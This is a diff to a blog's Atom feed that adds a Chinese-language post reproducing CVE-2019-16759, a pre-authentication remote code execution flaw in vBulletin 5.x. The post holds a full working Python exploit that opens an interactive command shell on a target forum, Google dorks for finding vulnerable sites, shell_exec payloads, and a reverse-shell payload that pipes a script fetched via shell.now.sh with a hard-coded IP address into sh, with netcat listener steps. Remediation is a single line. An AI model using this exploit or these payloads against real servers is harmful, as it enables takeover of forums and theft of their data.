@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://vkxss.top/"/>
-  <updated>2019-09-20T02:05:08.799Z</updated>
+  <updated>2019-09-25T16:35:57.775Z</updated>
   <id>http://vkxss.top/</id>
   
   <author>
@@ -15,6 +15,37 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>CVE-2019-16759/vBulletin 5.x 前台远程代码执行漏洞复现</title>
+    <link href="http://vkxss.top/2019/09/25/CVE-2019-16759/"/>
+    <id>http://vkxss.top/2019/09/25/CVE-2019-16759/</id>
+    <published>2019-09-25T07:30:08.000Z</published>
+    <updated>2019-09-25T16:35:57.775Z</updated>
+    
+    <content type="html"><![CDATA[<!-- toc --><ul><li><a href="#0x00-简介">0X00 简介</a></li><li><a href="#0x01-cve编号">0X01 CVE编号</a></li><li><a href="#0x02-漏洞威胁等级">0X02 漏洞威胁等级</a></li><li><a href="#0x03-影响范围">0X03 影响范围</a></li><li><a href="#0x04-漏洞描述">0X04 漏洞描述</a></li><li><a href="#0x05-漏洞poc">0X05 漏洞POC</a></li><li><a href="#0x06-漏洞复现">0X06 漏洞复现</a></li><li><a href="#0x07-修复建议">0X07 修复建议</a></li><li><a href="#0x08-reference">0X08 Reference</a></li></ul><!-- tocstop --><h2><span id="0x00-简介">0X00 简介</span></h2><ul><li>vBulletin 是一个商用的论坛程序，在全球拥有数万用户且增长速度很快。该论坛采用PHP Web语言及MySQL数据库的方式进行架构。《财富》 500强和Alexa排名前100万的公司网站大部分都在使用的一款互联网论坛程序。</li></ul><h2><span id="0x01-cve编号">0X01 CVE编号</span></h2><ul><li>CVE-2019-16759</li><li>相关信息链接：<a href="https://seclists.org/fulldisclosure/2019/Sep/31" target="_blank" rel="noopener">https://seclists.org/fulldisclosure/2019/Sep/31</a></li></ul><h2><span id="0x02-漏洞威胁等级">0X02 漏洞威胁等级</span></h2><ul><li>高危</li></ul><h2><span id="0x03-影响范围">0X03 影响范围</span></h2><ul><li>CVE-2019-16759漏洞影响：vBulletin 5.0.0 到最新 5.5.4版本</li></ul><h2><span id="0x04-漏洞描述">0X04 漏洞描述</span></h2><ul><li>漏洞通过请求ajax/render/widget_php进行模板注入触发代码执行。</li></ul><h2><span id="0x05-漏洞poc">0X05 漏洞POC</span></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line">#</span><br><span class="line"># vBulletin 5.x 0day pre-auth RCE exploit</span><br><span class="line"># </span><br><span class="line"># This should work on all versions from 5.0.0 till 5.5.4</span><br><span class="line">#</span><br><span class="line"># Google Dorks:</span><br><span class="line"># - site:*.vbulletin.net</span><br><span class="line"># - &quot;Powered by vBulletin Version 5.5.4&quot;</span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line">if len(sys.argv) != 2:</span><br><span class="line">    sys.exit(&quot;Usage: %s &lt;URL to vBulletin&gt;&quot; % sys.argv[0])</span><br><span class="line"></span><br><span class="line">params = &#123;&quot;routestring&quot;:&quot;ajax/render/widget_php&quot;&#125;</span><br><span class="line"></span><br><span class="line">while True:</span><br><span class="line">     try:</span><br><span class="line">          cmd = raw_input(&quot;vBulletin$ &quot;)</span><br><span class="line">          params[&quot;widgetConfig[code]&quot;] = &quot;echo shell_exec(&apos;&quot;+cmd+&quot;&apos;); exit;&quot;</span><br><span class="line">          r = requests.post(url = sys.argv[1], data = params)</span><br><span class="line">          if r.status_code == 200:</span><br><span class="line">               print r.text</span><br><span class="line">          else:</span><br><span class="line">               sys.exit(&quot;Exploit failed! :(&quot;)</span><br><span class="line">     except KeyboardInterrupt:</span><br><span class="line">          sys.exit(&quot;\nClosing shell...&quot;)</span><br><span class="line">     except Exception, e:</span><br><span class="line">          sys.exit(str(e))</span><br></pre></td></tr></table></figure><h2><span id="0x06-漏洞复现">0X06 漏洞复现</span></h2><ul><li><p>漏洞地址：</p><p>  <font face="微软雅黑"><center><img src="https://ae01.alicdn.com/kf/H243ff923b53b4679a8702a6009b941b9f.jpg" style="zoom:30%"></center></font></p></li><li><p>访问漏洞URL，修改请求方式为POST：</p><p>  <font face="微软雅黑"><center><img src="https://ae01.alicdn.com/kf/H21d8a202c5e54ce0ab3bf74ffac27aa5O.jpg" style="zoom:30%"></center></font></p></li><li><p>然后在post参数中可输入以下任意payload验证：</p><ul><li><p>payload1：widgetConfig[code] = echo shell_exec(‘id’);<br><font face="微软雅黑"><center><img src="https://ae01.alicdn.com/kf/He0f05a02b58e463ca5a05d3023d36e21P.jpg" style="zoom:30%"></center></font></p></li><li><p>payload2：widgetConfig[code] = echo shell_exec(‘whoami’);<br><font face="微软雅黑"><center><img src="https://ae01.alicdn.com/kf/H5c043157723a4bf58a3f908ad01e0e5ci.jpg" style="zoom:30%"></center></font></p></li><li><p>payload3：widgetConfig[code] = echo shell_exec(‘uname-a’);<br><font face="微软雅黑"><center><img src="https://ae01.alicdn.com/kf/Hd4a1783bda814bcc84064f03d41ffc7fs.jpg" style="zoom:30%"></center></font></p></li><li><p>payload4：widgetConfig[code] = echo shell_exec(‘curl <a href="https://shell.now.sh/23.106.141.192:1337" target="_blank" rel="noopener">https://shell.now.sh/23.106.141.192:1337</a> | sh’);</p></li><li><p>注意使用payload4反弹shell，参考如下：</p><ul><li><p>Reverse Shell as a Service</p><ul><li><a href="https://github.com/lukechilds/reverse-shell" target="_blank" rel="noopener">https://github.com/lukechilds/reverse-shell</a></li></ul></li><li><p>在你的机器：nc -l 1337<br><font face="微软雅黑"><center><img src="https://ae01.alicdn.com/kf/H6e9006224f994e6dbb970bda9f3fd112J.jpg" style="zoom:30%"></center></font></p></li><li><p>在目标机器上：curl <a href="https://shell.now.sh/yourip:1337" target="_blank" rel="noopener">https://shell.now.sh/yourip:1337</a> | sh<br><font face="微软雅黑"><center><img src="https://ae01.alicdn.com/kf/H776be97db07f4e419dc90d6cece7f660E.jpg" style="zoom:30%"></center></font></p></li><li><p>反弹Shell会话<br><font face="微软雅黑"><center><img src="https://ae01.alicdn.com/kf/H6768d9531f6f47ebba8725d679468d32a.jpg" style="zoom:30%"></center></font></p></li></ul></li></ul></li></ul><h2><span id="0x07-修复建议">0X07 修复建议</span></h2><ul><li>上waf或防火墙配置规则拦截,等待官方修复打补丁。</li></ul><h2><span id="0x08-reference">0X08 Reference</span></h2><ul><li>参考链接：<a href="https://www.youtube.com/watch?v=ymLRqsbCuVY" target="_blank" rel="noopener">https://www.youtube.com/watch?v=ymLRqsbCuVY</a></li></ul>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;!-- toc --&gt;
+
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&quot;#0x00-简介&quot;&gt;0X00 简介&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;#0x01-cve编号&quot;&gt;0X01 CVE编号&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;#0x02-漏洞威胁等级&quot;&gt;0X02 漏洞威
+      
+    
+    </summary>
+    
+    
+      <category term="CVE-2019" scheme="http://vkxss.top/categories/CVE-2019/"/>
+    
+    
+      <category term="CVE-2019-16759" scheme="http://vkxss.top/tags/CVE-2019-16759/"/>
+    
+  </entry>
   
   <entry>
     <title>绕过CSRF防御总结</title>
